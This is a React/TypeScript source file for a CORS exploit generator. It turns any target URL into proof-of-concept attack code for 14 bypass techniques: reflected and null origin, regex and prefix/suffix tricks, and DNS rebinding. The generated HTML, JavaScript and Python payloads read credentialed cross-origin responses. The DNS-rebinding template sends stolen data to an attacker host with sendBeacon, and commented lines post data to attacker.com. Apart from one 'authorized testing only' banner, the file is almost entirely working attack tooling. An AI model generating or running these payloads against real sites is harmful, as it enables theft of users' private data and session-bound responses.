import React, { useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCopy, faDownload, faFlask, faExclamationTriangle, faCode, faGlobe } from '@fortawesome/free-solid-svg-icons';
import type { CorsExploitGeneratorData, CorsExploitType, CorsOutputFormat } from './tool-types';

type Props = {
  data: CorsExploitGeneratorData | undefined;
  onChange: (data: CorsExploitGeneratorData) => void;
};

// Extended exploit types with categories
type ExploitCategory = 'origin' | 'regex' | 'header' | 'special';

const EXPLOIT_TYPES: { value: CorsExploitType; label: string; description: string; category: ExploitCategory; risk: 'critical' | 'high' | 'medium' }[] = [
  // Origin-based exploits
  {
    value: 'reflected-origin',
    label: 'Reflected Origin',
    description: 'Server reflects Origin header directly in ACAO',
    category: 'origin',
    risk: 'critical'
  },
  {
    value: 'null-origin',
    label: 'Null Origin',
    description: 'Server accepts "null" origin (sandboxed iframes, data: URIs)',
    category: 'origin',
    risk: 'critical'
  },
  {
    value: 'wildcard-credentials',
    label: 'Wildcard with Credentials',
    description: 'Server sends * with credentials: true (browser blocks but indicates misconfiguration)',
    category: 'origin',
    risk: 'high'
  },
  // Regex bypass exploits
  {
    value: 'wildcard-subdomain',
    label: 'Wildcard Subdomain',
    description: 'Server accepts *.target.com - takeover any subdomain',
    category: 'regex',
    risk: 'high'
  },
  {
    value: 'prefix-match',
    label: 'Prefix Match Bypass',
    description: 'Origin check: startsWith("target.com") → target.com.evil.com',
    category: 'regex',
    risk: 'high'
  },
  {
    value: 'suffix-match',
    label: 'Suffix Match Bypass',
    description: 'Origin check: endsWith("target.com") → attackertarget.com',
    category: 'regex',
    risk: 'high'
  },
  {
    value: 'dot-escape',
    label: 'Dot Escape Bypass',
    description: 'Regex forgets to escape dots: target.com → targetXcom.evil.com',
    category: 'regex',
    risk: 'high'
  },
  {
    value: 'underscore-bypass',
    label: 'Underscore Bypass',
    description: 'Browsers treat underscores specially in domains',
    category: 'regex',
    risk: 'medium'
  },
  // Protocol/port exploits
  {
    value: 'protocol-bypass',
    label: 'Protocol Bypass',
    description: 'http:// accepted when only https:// should be',
    category: 'special',
    risk: 'high'
  },
  {
    value: 'port-bypass',
    label: 'Port Bypass',
    description: 'Non-standard ports accepted: target.com:8080',
    category: 'special',
    risk: 'medium'
  },
  // Special techniques
  {
    value: 'pre-domain',
    label: 'Pre-Domain Attack',
    description: 'Basic auth injection: https://target.com@evil.com',
    category: 'special',
    risk: 'medium'
  },
  {
    value: 'post-domain',
    label: 'Post-Domain Attack',
    description: 'Path confusion: https://evil.com/target.com',
    category: 'special',
    risk: 'medium'
  },
  {
    value: 'special-chars',
    label: 'Special Characters',
    description: 'URL encoding tricks: %00, %20, tab characters',
    category: 'special',
    risk: 'medium'
  },
  {
    value: 'dns-rebinding',
    label: 'DNS Rebinding',
    description: 'Change DNS after origin check passes',
    category: 'special',
    risk: 'critical'
  }
];

const RISK_COLORS = {
  critical: 'text-red-400 bg-red-900/20 border-red-500/30',
  high: 'text-orange-400 bg-orange-900/20 border-orange-500/30',
  medium: 'text-yellow-400 bg-yellow-900/20 border-yellow-500/30'
};

const OUTPUT_FORMATS: { value: CorsOutputFormat; label: string }[] = [
  { value: 'html', label: 'HTML PoC' },
  { value: 'javascript', label: 'JavaScript' },
  { value: 'python', label: 'Python requests' },
  { value: 'curl', label: 'cURL command' },
  { value: 'burp', label: 'Burp Suite' }
];

const generateExploitCode = (
  targetUrl: string,
  exploitType: CorsExploitType,
  withCredentials: boolean,
  customOrigin: string,
  format: CorsOutputFormat,
  httpMethod: string
): string => {
  const credentialsAttr = withCredentials ? '\n    credentials: "include",' : '';

  // Calculate attacker domains based on exploit type
  let attackerOrigin = customOrigin;
  let targetDomain = '';

  try {
    targetDomain = new URL(targetUrl).hostname;
  } catch {
    targetDomain = 'target.com';
  }

  if (!customOrigin) {
    switch (exploitType) {
      case 'wildcard-subdomain':
        attackerOrigin = `evil.${targetDomain}`;
        break;
      case 'prefix-match':
        attackerOrigin = `${targetDomain}.evil.com`;
        break;
      case 'suffix-match':
        attackerOrigin = `attacker${targetDomain}`;
        break;
      case 'dot-escape':
        attackerOrigin = targetDomain.replace(/\./g, 'X') + '.evil.com';
        break;
      case 'underscore-bypass':
        attackerOrigin = `evil_${targetDomain}`;
        break;
      case 'port-bypass':
        attackerOrigin = `${targetDomain}:8080`;
        break;
      case 'pre-domain':
        attackerOrigin = 'evil.com';
        break;
      case 'post-domain':
        attackerOrigin = 'evil.com';
        break;
      default:
        attackerOrigin = 'evil.com';
    }
  }

  // Generate based on format
  if (format === 'curl') {
    return generateCurlCode(targetUrl, exploitType, attackerOrigin, withCredentials, httpMethod);
  } else if (format === 'python') {
    return generatePythonCode(targetUrl, exploitType, attackerOrigin, withCredentials, httpMethod);
  } else if (format === 'burp') {
    return generateBurpCode(targetUrl, attackerOrigin, httpMethod);
  } else if (format === 'javascript') {
    return generateJsCode(targetUrl, withCredentials, httpMethod);
  }

  // HTML PoC generation
  return generateHtmlPoc(targetUrl, exploitType, attackerOrigin, withCredentials, credentialsAttr, httpMethod);
};

const generateCurlCode = (
  targetUrl: string,
  exploitType: CorsExploitType,
  attackerOrigin: string,
  withCredentials: boolean,
  httpMethod: string
): string => {
  const originHeader = exploitType === 'null-origin' ? 'null' : `https://${attackerOrigin}`;
  const cookieFlag = withCredentials ? ' -b "session=YOUR_SESSION_COOKIE"' : '';

  return `# CORS Bypass Test - ${exploitType}
# Test if the server reflects the origin or allows the bypass

curl -X ${httpMethod} \\
  -H "Origin: ${originHeader}" \\
  -H "Accept: */*" \\
  -H "Content-Type: application/json"${cookieFlag} \\
  -v "${targetUrl}" 2>&1 | grep -i "access-control"

# Look for:
# - Access-Control-Allow-Origin: ${originHeader}
# - Access-Control-Allow-Credentials: true

# If both are present, CORS is misconfigured!`;
};

const generatePythonCode = (
  targetUrl: string,
  exploitType: CorsExploitType,
  attackerOrigin: string,
  withCredentials: boolean,
  httpMethod: string
): string => {
  const originHeader = exploitType === 'null-origin' ? 'null' : `https://${attackerOrigin}`;

  return `#!/usr/bin/env python3
"""
CORS Bypass Tester - ${exploitType}
Tests for CORS misconfiguration vulnerabilities
"""
import requests

def test_cors():
    target_url = "${targetUrl}"

    headers = {
        "Origin": "${originHeader}",
        "Accept": "*/*",
        "Content-Type": "application/json"
    }

    ${withCredentials ? `cookies = {
        "session": "YOUR_SESSION_COOKIE"
    }

    response = requests.${httpMethod.toLowerCase()}(target_url, headers=headers, cookies=cookies)` : `response = requests.${httpMethod.toLowerCase()}(target_url, headers=headers)`}

    acao = response.headers.get("Access-Control-Allow-Origin", "")
    acac = response.headers.get("Access-Control-Allow-Credentials", "")

    print(f"[*] Testing: {target_url}")
    print(f"[*] Origin sent: ${originHeader}")
    print(f"[*] ACAO received: {acao}")
    print(f"[*] ACAC received: {acac}")

    if acao == "${originHeader}" or acao == "*":
        if acac.lower() == "true" or not ${withCredentials}:
            print("[!] VULNERABLE - CORS misconfiguration detected!")
            print(f"[+] Response data: {response.text[:500]}")
            return True
        else:
            print("[~] Partially vulnerable - no credentials allowed")
    else:
        print("[-] Not vulnerable to this bypass")

    return False

if __name__ == "__main__":
    test_cors()`;
};

const generateBurpCode = (
  targetUrl: string,
  attackerOrigin: string,
  httpMethod: string
): string => {
  const url = new URL(targetUrl);
  return `${httpMethod} ${url.pathname}${url.search} HTTP/1.1
Host: ${url.hostname}
Origin: https://${attackerOrigin}
Accept: */*
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Cookie: session=YOUR_SESSION_COOKIE

`;
};

const generateJsCode = (
  targetUrl: string,
  withCredentials: boolean,
  httpMethod: string
): string => {
  return `// CORS Exploitation - JavaScript
// Run this in browser console on attacker-controlled origin

async function exploitCors() {
  const targetUrl = "${targetUrl}";

  try {
    const response = await fetch(targetUrl, {
      method: "${httpMethod}",
      mode: "cors",
      ${withCredentials ? 'credentials: "include",' : ''}
      headers: {
        "Accept": "*/*",
        "Content-Type": "application/json"
      }
    });

    if (response.ok) {
      const data = await response.text();
      console.log("[+] CORS bypass successful!");
      console.log("[+] Response:", data);

      // Exfiltrate data to attacker server
      // await fetch("https://attacker.com/log", {
      //   method: "POST",
      //   body: JSON.stringify({ stolen: data })
      // });

      return data;
    } else {
      console.log("[-] Request failed:", response.status);
    }
  } catch (err) {
    console.log("[-] CORS blocked:", err.message);
  }
}

exploitCors();`;
};

const generateHtmlPoc = (
  targetUrl: string,
  exploitType: CorsExploitType,
  attackerOrigin: string,
  withCredentials: boolean,
  credentialsAttr: string,
  httpMethod: string
): string => {
  const commonFetch = `
    fetch(targetUrl, {
      method: "${httpMethod}",${credentialsAttr}
      mode: "cors",
      headers: {
        "Accept": "*/*"
      }
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("result").innerHTML =
        "<pre style='color:#0f0;background:#000;padding:10px;'>" +
        escapeHtml(data.substring(0, 2000)) + "</pre>";
      log("[+] Data exfiltrated successfully!");
      // Exfiltrate to attacker server:
      // fetch("https://attacker.com/log?data=" + encodeURIComponent(data));
    })
    .catch(err => {
      document.getElementById("result").innerHTML =
        "<div style='color:#f00;'>[-] Error: " + err.message + "</div>";
      log("[-] CORS blocked: " + err.message);
    });`;

  if (exploitType === 'null-origin') {
    return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Null Origin Bypass</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
    .log { background: #0d0d1a; padding: 10px; margin: 10px 0; border-radius: 4px; max-height: 200px; overflow: auto; }
    .success { color: #0f0; } .error { color: #f00; } .info { color: #0ff; }
    button { background: #4a4a8a; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 5px; }
    button:hover { background: #6a6aaa; }
  </style>
</head>
<body>
  <h2>CORS Exploit - Null Origin Bypass</h2>
  <p class="info">This exploits servers that accept Origin: null</p>
  <p>Target: <code>${targetUrl}</code></p>
  <button onclick="exploit()">Execute Exploit</button>
  <div id="logArea" class="log"></div>
  <h3>Result:</h3>
  <div id="result">Waiting...</div>

  <script>
    function log(msg) {
      const cls = msg.startsWith('[+]') ? 'success' : msg.startsWith('[-]') ? 'error' : 'info';
      document.getElementById('logArea').innerHTML += '<div class="' + cls + '">' + msg + '</div>';
    }
    function escapeHtml(s) {
      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }
  </script>

  <!-- Null origin via sandboxed iframe or data: URI -->
  <script>
    function exploit() {
      log("[*] Creating sandboxed iframe to send null origin...");

      const iframe = document.createElement('iframe');
      iframe.sandbox = 'allow-scripts allow-forms';
      iframe.style.display = 'none';
      iframe.srcdoc = \`
        <script>
          const targetUrl = "${targetUrl}";
          fetch(targetUrl, {
            method: "${httpMethod}",${credentialsAttr}
            mode: "cors"
          })
          .then(r => r.text())
          .then(data => parent.postMessage({type:'success', data:data}, '*'))
          .catch(e => parent.postMessage({type:'error', error:e.message}, '*'));
        <\\/script>
      \`;
      document.body.appendChild(iframe);

      // Also try data: URI approach
      log("[*] Also trying data: URI approach...");
    }

    window.addEventListener('message', e => {
      if (e.data.type === 'success') {
        log('[+] NULL origin bypass SUCCESSFUL!');
        document.getElementById('result').innerHTML =
          "<pre style='color:#0f0;background:#000;padding:10px;'>" +
          e.data.data.substring(0, 2000).replace(/</g,'&lt;') + "</pre>";
      } else if (e.data.type === 'error') {
        log('[-] Error: ' + e.data.error);
      }
    });
  </script>
</body>
</html>`;
  }

  if (exploitType === 'dns-rebinding') {
    return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - DNS Rebinding Attack</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
    .warning { background: #4a2a00; border: 1px solid #f90; padding: 10px; margin: 10px 0; border-radius: 4px; }
    code { background: #2a2a4a; padding: 2px 6px; border-radius: 3px; }
  </style>
</head>
<body>
  <h2>CORS Exploit - DNS Rebinding Attack</h2>

  <div class="warning">
    <strong>⚠️ Advanced Attack</strong><br>
    DNS rebinding requires a custom DNS server that alternates responses.
  </div>

  <h3>Attack Flow:</h3>
  <ol>
    <li>Attacker hosts this page on <code>attacker.com</code></li>
    <li>DNS for <code>attacker.com</code> initially resolves to attacker IP</li>
    <li>Page loads, browser caches origin as <code>attacker.com</code></li>
    <li>After TTL expires, DNS re-resolves to <code>${targetUrl}</code></li>
    <li>Browser thinks it's same-origin, but request goes to target!</li>
  </ol>

  <h3>Setup Requirements:</h3>
  <pre style="background:#0d0d1a;padding:10px;">
# DNS Server Configuration (example using singularity)
# https://github.com/nccgroup/singularity

1. Set up attacker domain with low TTL (e.g., 1 second)
2. Configure DNS to alternate between:
   - First request: Attacker IP (serves this page)
   - Second request: Target IP (${targetUrl})

3. Page makes delayed request after TTL expires
4. Browser sends request to target with attacker.com origin

# Tools:
- Singularity of Origin: https://github.com/nccgroup/singularity
- rbndr: https://github.com/taviso/rbndr
- whonow: https://github.com/nickvdyck/whonow
  </pre>

  <h3>Exploit Code (runs after DNS rebind):</h3>
  <pre style="background:#0d0d1a;padding:10px;">
setTimeout(() => {
  // After DNS rebinding, this goes to target but with our origin
  fetch("${targetUrl}", {
    method: "${httpMethod}",${credentialsAttr}
    mode: "cors"
  })
  .then(r => r.text())
  .then(data => {
    // Exfiltrate via another channel (beacon, image, etc)
    navigator.sendBeacon("https://actual-attacker.com/log", data);
  });
}, 5000); // Wait for DNS TTL to expire
  </pre>
</body>
</html>`;
  }

  // Standard HTML PoC for other exploit types
  return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - ${exploitType}</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
    .log { background: #0d0d1a; padding: 10px; margin: 10px 0; border-radius: 4px; max-height: 200px; overflow: auto; }
    .success { color: #0f0; } .error { color: #f00; } .info { color: #0ff; }
    button { background: #4a4a8a; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 5px; }
    button:hover { background: #6a6aaa; }
    .note { background: #2a2a4a; padding: 10px; border-radius: 4px; margin: 10px 0; }
    code { background: #3a3a5a; padding: 2px 6px; border-radius: 3px; }
  </style>
</head>
<body>
  <h2>CORS Exploit - ${EXPLOIT_TYPES.find(t => t.value === exploitType)?.label || exploitType}</h2>

  <div class="note">
    <strong>Bypass Type:</strong> ${EXPLOIT_TYPES.find(t => t.value === exploitType)?.description || ''}<br>
    <strong>Host this page on:</strong> <code>https://${attackerOrigin}</code>
  </div>

  <p>Target: <code>${targetUrl}</code></p>
  <p>Credentials: <code>${withCredentials ? 'included' : 'omitted'}</code></p>

  <button onclick="exploit()">Execute Exploit</button>
  <button onclick="testPreflight()">Test Preflight</button>

  <div id="logArea" class="log"></div>

  <h3>Result:</h3>
  <div id="result">Click "Execute Exploit" to begin...</div>

  <script>
    function log(msg) {
      const cls = msg.startsWith('[+]') ? 'success' : msg.startsWith('[-]') ? 'error' : 'info';
      document.getElementById('logArea').innerHTML += '<div class="' + cls + '">' + msg + '</div>';
    }

    function escapeHtml(s) {
      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function exploit() {
      const targetUrl = "${targetUrl}";
      log("[*] Sending ${httpMethod} request to " + targetUrl);
      log("[*] Current origin: " + window.location.origin);
      ${commonFetch}
    }

    function testPreflight() {
      const targetUrl = "${targetUrl}";
      log("[*] Testing preflight (OPTIONS) request...");

      fetch(targetUrl, {
        method: "OPTIONS",
        headers: {
          "Access-Control-Request-Method": "${httpMethod}",
          "Access-Control-Request-Headers": "content-type"
        }
      })
      .then(response => {
        const acao = response.headers.get("Access-Control-Allow-Origin");
        const acac = response.headers.get("Access-Control-Allow-Credentials");
        const acam = response.headers.get("Access-Control-Allow-Methods");

        log("[*] ACAO: " + (acao || "not set"));
        log("[*] ACAC: " + (acac || "not set"));
        log("[*] ACAM: " + (acam || "not set"));

        if (acao === "*" || acao === window.location.origin) {
          log("[+] Origin is allowed!");
        }
      })
      .catch(err => log("[-] Preflight error: " + err.message));
    }
  </script>

  <hr style="border-color:#333;margin:20px 0;">
  <h3>Attack Notes:</h3>
  <div class="note">
    <strong>How this bypass works:</strong><br>
    ${getBypassExplanation(exploitType, targetUrl, attackerOrigin)}
  </div>
</body>
</html>`;
};

const getBypassExplanation = (exploitType: CorsExploitType, targetUrl: string, attackerOrigin: string): string => {
  const target = (() => { try { return new URL(targetUrl).hostname; } catch { return 'target.com'; } })();

  const explanations: Record<CorsExploitType, string> = {
    'reflected-origin': 'The server blindly reflects any Origin header in Access-Control-Allow-Origin. Any website can read the response.',
    'null-origin': 'The server accepts "null" as a valid origin. Sandboxed iframes and data: URIs send null origin.',
    'wildcard-credentials': 'Server sends ACAO: * with credentials. Browsers block this, but it shows poor CORS configuration.',
    'wildcard-subdomain': `Server accepts *.${target}. If attacker controls any subdomain (XSS, subdomain takeover), they can bypass CORS.`,
    'prefix-match': `Server checks if origin starts with "${target}". Attacker registers ${target}.evil.com to bypass.`,
    'suffix-match': `Server checks if origin ends with "${target}". Attacker registers evil${target} to bypass.`,
    'dot-escape': `Server regex uses "${target}" without escaping dots. Dots match any character, so "${target.replace(/\./g, 'X')}.evil.com" matches.`,
    'underscore-bypass': `Some servers have issues with underscores in origin handling. Try evil_${target} or _${target}.`,
    'protocol-bypass': 'Server allows http:// when only https:// should be permitted. MitM attacker can intercept.',
    'port-bypass': `Server doesn't validate port. ${target}:8080 might work even if main site is on :443.`,
    'pre-domain': `Using basic auth syntax: https://${target}@evil.com sends origin evil.com but URL looks like ${target}.`,
    'post-domain': `Path confusion: https://evil.com/${target} - the target appears in path but origin is evil.com.`,
    'special-chars': 'URL-encoded characters like %00 (null byte), %20 (space), or tabs may confuse origin parsing.',
    'dns-rebinding': 'Change DNS resolution after browser caches the origin. Initial request to attacker IP, subsequent to target.'
  };

  return explanations[exploitType] || 'Standard CORS bypass technique.';
};

const CorsExploitGenerator: React.FC<Props> = ({ data, onChange }) => {
  const targetUrl = data?.targetUrl ?? '';
  const exploitType = data?.exploitType ?? 'reflected-origin';
  const withCredentials = data?.withCredentials ?? true;
  const customOrigin = data?.customOrigin ?? '';
  const outputFormat = data?.outputFormat ?? 'html';
  const httpMethod = data?.httpMethod ?? 'GET';
  const filterCategory = data?.filterCategory ?? 'all';
  const [copied, setCopied] = useState(false);
  const [activeTab, setActiveTab] = useState<'generate' | 'test'>('generate');

  const filteredExploits = filterCategory === 'all'
    ? EXPLOIT_TYPES
    : EXPLOIT_TYPES.filter(e => e.category === filterCategory);

  const generatedCode = targetUrl.trim()
    ? generateExploitCode(targetUrl, exploitType, withCredentials, customOrigin, outputFormat, httpMethod)
    : '';

  const handleCopy = () => {
    navigator.clipboard.writeText(generatedCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownload = () => {
    const ext = outputFormat === 'html' ? 'html' : outputFormat === 'python' ? 'py' : 'txt';
    const mimeType = outputFormat === 'html' ? 'text/html' : 'text/plain';
    const blob = new Blob([generatedCode], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cors-poc-${exploitType}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleQuickTest = async () => {
    if (!targetUrl) return;

    onChange({ ...data, testResult: undefined, testRunning: true });

    try {
      const response = await fetch(targetUrl, {
        method: 'OPTIONS',
        mode: 'cors',
        headers: {
          'Access-Control-Request-Method': httpMethod,
          'Access-Control-Request-Headers': 'content-type'
        }
      });

      const acao = response.headers.get('Access-Control-Allow-Origin');
      const acac = response.headers.get('Access-Control-Allow-Credentials');
      const acam = response.headers.get('Access-Control-Allow-Methods');

      onChange({
        ...data,
        testRunning: false,
        testResult: {
          acao: acao || 'not set',
          acac: acac || 'not set',
          acam: acam || 'not set',
          status: response.status
        }
      });
    } catch (err) {
      onChange({
        ...data,
        testRunning: false,
        testResult: {
          error: err instanceof Error ? err.message : 'Unknown error',
          status: 0
        }
      });
    }
  };

  const selectedExploit = EXPLOIT_TYPES.find(t => t.value === exploitType);

  return (
    <div className="flex flex-col h-full text-xs">
      <div className="flex items-center justify-between mb-2">
        <div className="text-slate-200 font-medium">CORS Exploit Generator</div>
        <div className="flex gap-1">
          <button
            onClick={() => setActiveTab('generate')}
            className={`px-2 py-1 text-[10px] rounded transition-colors ${
              activeTab === 'generate' ? 'bg-blue-600 text-white' : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
            }`}
          >
            <FontAwesomeIcon icon={faCode} className="w-2.5 h-2.5 mr-1" />
            Generate
          </button>
          <button
            onClick={() => setActiveTab('test')}
            className={`px-2 py-1 text-[10px] rounded transition-colors ${
              activeTab === 'test' ? 'bg-blue-600 text-white' : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
            }`}
          >
            <FontAwesomeIcon icon={faFlask} className="w-2.5 h-2.5 mr-1" />
            Quick Test
          </button>
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-2">
        Generate PoC code for 14 CORS bypass techniques
      </div>

      {/* Target URL */}
      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
        <div className="flex items-center justify-between mb-1">
          <label className="text-[10px] text-slate-500">Target URL</label>
          <button
            onClick={() => onChange({ ...data, targetUrl: window.location.href })}
            className="text-[9px] text-blue-400 hover:text-blue-300"
          >
            Use Current
          </button>
        </div>
        <input
          type="url"
          value={targetUrl}
          onChange={(e) => onChange({ ...data, targetUrl: e.target.value })}
          placeholder="https://vulnerable.com/api/sensitive-data"
          className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
        />
      </div>

      {activeTab === 'generate' && (
        <>
          {/* Category filter + Method */}
          <div className="flex gap-2 mb-2">
            <div className="flex-1 rounded border border-slate-700 bg-slate-800/30 p-2">
              <label className="text-[10px] text-slate-500 mb-1 block">Category</label>
              <select
                value={filterCategory}
                onChange={(e) => onChange({ ...data, filterCategory: e.target.value as typeof filterCategory })}
                className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
              >
                <option value="all">All ({EXPLOIT_TYPES.length})</option>
                <option value="origin">Origin ({EXPLOIT_TYPES.filter(e => e.category === 'origin').length})</option>
                <option value="regex">Regex ({EXPLOIT_TYPES.filter(e => e.category === 'regex').length})</option>
                <option value="special">Special ({EXPLOIT_TYPES.filter(e => e.category === 'special').length})</option>
              </select>
            </div>
            <div className="w-24 rounded border border-slate-700 bg-slate-800/30 p-2">
              <label className="text-[10px] text-slate-500 mb-1 block">Method</label>
              <select
                value={httpMethod}
                onChange={(e) => onChange({ ...data, httpMethod: e.target.value })}
                className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
              >
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
                <option value="PATCH">PATCH</option>
              </select>
            </div>
          </div>

          {/* Exploit Type */}
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
            <label className="text-[10px] text-slate-500 mb-1 block">Bypass Technique</label>
            <select
              value={exploitType}
              onChange={(e) => onChange({ ...data, exploitType: e.target.value as CorsExploitType })}
              className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
            >
              {filteredExploits.map(type => (
                <option key={type.value} value={type.value}>
                  [{type.risk.toUpperCase()}] {type.label}
                </option>
              ))}
            </select>
            {selectedExploit && (
              <div className={`text-[9px] mt-1 px-2 py-1 rounded border ${RISK_COLORS[selectedExploit.risk]}`}>
                {selectedExploit.description}
              </div>
            )}
          </div>

          {/* Output format + options */}
          <div className="flex gap-2 mb-2">
            <div className="flex-1 rounded border border-slate-700 bg-slate-800/30 p-2">
              <label className="text-[10px] text-slate-500 mb-1 block">Output Format</label>
              <select
                value={outputFormat}
                onChange={(e) => onChange({ ...data, outputFormat: e.target.value as CorsOutputFormat })}
                className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
              >
                {OUTPUT_FORMATS.map(f => (
                  <option key={f.value} value={f.value}>{f.label}</option>
                ))}
              </select>
            </div>
            <div className="rounded border border-slate-700 bg-slate-800/30 p-2 flex items-center">
              <label className="flex items-center gap-2 text-[10px] text-slate-300">
                <input
                  type="checkbox"
                  checked={withCredentials}
                  onChange={(e) => onChange({ ...data, withCredentials: e.target.checked })}
                  className="rounded bg-slate-700 border-slate-600 w-3 h-3"
                />
                Include Cookies
              </label>
            </div>
          </div>

          {/* Custom origin for certain exploits */}
          {['wildcard-subdomain', 'prefix-match', 'suffix-match', 'dot-escape', 'underscore-bypass'].includes(exploitType) && (
            <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
              <label className="text-[10px] text-slate-500 mb-1 block">Custom Attacker Origin (optional)</label>
              <input
                type="text"
                value={customOrigin}
                onChange={(e) => onChange({ ...data, customOrigin: e.target.value })}
                placeholder="evil.target.com"
                className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
              />
            </div>
          )}

          {/* Generated code */}
          {generatedCode && (
            <div className="flex-1 overflow-hidden flex flex-col min-h-0">
              <div className="flex items-center justify-between mb-1">
                <label className="text-[10px] text-slate-400">Generated Code</label>
                <div className="flex gap-1">
                  <button
                    onClick={handleCopy}
                    className="rounded bg-slate-800 px-2 py-0.5 text-[9px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
                  >
                    <FontAwesomeIcon icon={faCopy} className="w-2 h-2" />
                    {copied ? 'Copied!' : 'Copy'}
                  </button>
                  <button
                    onClick={handleDownload}
                    className="rounded bg-slate-800 px-2 py-0.5 text-[9px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
                  >
                    <FontAwesomeIcon icon={faDownload} className="w-2 h-2" />
                    Download
                  </button>
                </div>
              </div>
              <pre className="text-[9px] text-slate-300 bg-slate-800/50 p-2 rounded border border-slate-700 overflow-auto flex-1 font-mono whitespace-pre-wrap">
                {generatedCode}
              </pre>
            </div>
          )}
        </>
      )}

      {activeTab === 'test' && (
        <div className="flex-1 flex flex-col">
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
            <div className="flex items-center justify-between mb-2">
              <label className="text-[10px] text-slate-400">Quick CORS Test</label>
              <button
                onClick={handleQuickTest}
                disabled={!targetUrl || data?.testRunning}
                className="rounded bg-blue-600 px-3 py-1 text-[10px] text-white hover:bg-blue-500 disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-1"
              >
                <FontAwesomeIcon icon={faGlobe} className="w-2.5 h-2.5" />
                {data?.testRunning ? 'Testing...' : 'Test Now'}
              </button>
            </div>
            <div className="text-[9px] text-slate-500">
              Sends an OPTIONS preflight request to check CORS headers.
            </div>
          </div>

          {data?.testResult && (
            <div className="rounded border border-slate-700 bg-slate-800/30 p-2 flex-1">
              <div className="text-[10px] text-slate-400 mb-2">Test Results</div>

              {data.testResult.error ? (
                <div className="text-red-400 text-[10px]">
                  <FontAwesomeIcon icon={faExclamationTriangle} className="w-3 h-3 mr-1" />
                  Error: {data.testResult.error}
                </div>
              ) : (
                <div className="space-y-1">
                  <div className="flex justify-between text-[10px]">
                    <span className="text-slate-500">Status:</span>
                    <span className="text-slate-300">{data.testResult.status}</span>
                  </div>
                  <div className="flex justify-between text-[10px]">
                    <span className="text-slate-500">ACAO:</span>
                    <span className={data.testResult.acao === '*' ? 'text-red-400' : 'text-slate-300'}>
                      {data.testResult.acao}
                    </span>
                  </div>
                  <div className="flex justify-between text-[10px]">
                    <span className="text-slate-500">ACAC:</span>
                    <span className={data.testResult.acac === 'true' ? 'text-orange-400' : 'text-slate-300'}>
                      {data.testResult.acac}
                    </span>
                  </div>
                  <div className="flex justify-between text-[10px]">
                    <span className="text-slate-500">ACAM:</span>
                    <span className="text-slate-300">{data.testResult.acam}</span>
                  </div>

                  {/* Analysis */}
                  <div className="mt-2 pt-2 border-t border-slate-700">
                    <div className="text-[10px] text-slate-400 mb-1">Analysis:</div>
                    {data.testResult.acao === '*' && data.testResult.acac === 'true' && (
                      <div className="text-red-400 text-[9px]">
                        Critical: Wildcard with credentials (browsers will block but misconfigured)
                      </div>
                    )}
                    {data.testResult.acao === '*' && data.testResult.acac !== 'true' && (
                      <div className="text-orange-400 text-[9px]">
                        Warning: Wildcard origin allows any site to read (without credentials)
                      </div>
                    )}
                    {data.testResult.acao !== '*' && data.testResult.acao !== 'not set' && (
                      <div className="text-yellow-400 text-[9px]">
                        Try reflected origin: check if your origin gets reflected in ACAO
                      </div>
                    )}
                    {data.testResult.acao === 'not set' && (
                      <div className="text-green-400 text-[9px]">
                        Good: No ACAO header in preflight (CORS may be properly restricted)
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      <div className="rounded border border-yellow-500/30 bg-yellow-900/20 p-2 mt-2 text-[9px] text-yellow-400">
        <FontAwesomeIcon icon={faExclamationTriangle} className="w-2.5 h-2.5 mr-1" />
        <strong>Warning:</strong> Authorized security testing only.
      </div>
    </div>
  );
};

export class CorsExploitGeneratorTool {
  static Component = CorsExploitGenerator;
}
